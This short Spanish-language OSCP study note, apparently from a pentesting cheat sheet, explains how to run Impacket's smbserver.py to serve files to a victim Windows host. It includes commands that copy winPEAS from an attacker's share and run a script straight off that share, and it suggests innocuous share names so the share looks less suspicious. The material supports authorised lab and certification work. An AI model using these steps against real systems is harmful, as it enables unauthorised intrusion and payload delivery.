`smbserver.py` es una utilidad de Impacket que permite levantar un servidor SMB temporal desde Kali Linux. Muy útil en OSCP para compartir binarios, DLLs o scripts con la máquina víctima sin requerir instalación adicional del lado del atacante.

---

## Instalación (si no lo tienes)

```bash
sudo apt install impacket-scripts
```

O con pip:
```bash
pip install impacket
```

---

## Uso básico

Crea un directorio con los archivos que deseas compartir:
```bash
mkdir smbshare
cp winPEAS.exe smbshare/
```

Inicia el servidor SMB:
```bash
sudo smbserver.py -smb2support SHARE smbshare/
```

- `SHARE` es el nombre del recurso compartido SMB
- `smbshare/` es el path local al directorio compartido

---

## Acceder desde Windows víctima

### Desde PowerShell o cmd:
```powershell
copy \\<tu_ip>\SHARE\winPEAS.exe .
```

### Ejecutar directamente desde red (sin copiar):
```powershell
\<tu_ip>\SHARE\script.ps1
```

---

## Casos de Uso OSCP

- Compartir `winPEAS.exe`, DLLs, payloads de `msfvenom`, scripts `.ps1`
- Evitar servidores HTTP si el puerto 80 está filtrado
- Acceder a archivos sin descargar explícitamente (ejecución remota directa)

---

## Buenas Prácticas

- Usar `-smb2support` para mejorar compatibilidad
- Evitar nombres de share sospechosos (usa cosas como `logs`, `backup`, etc.)
- Detener el servidor cuando ya no se use

---
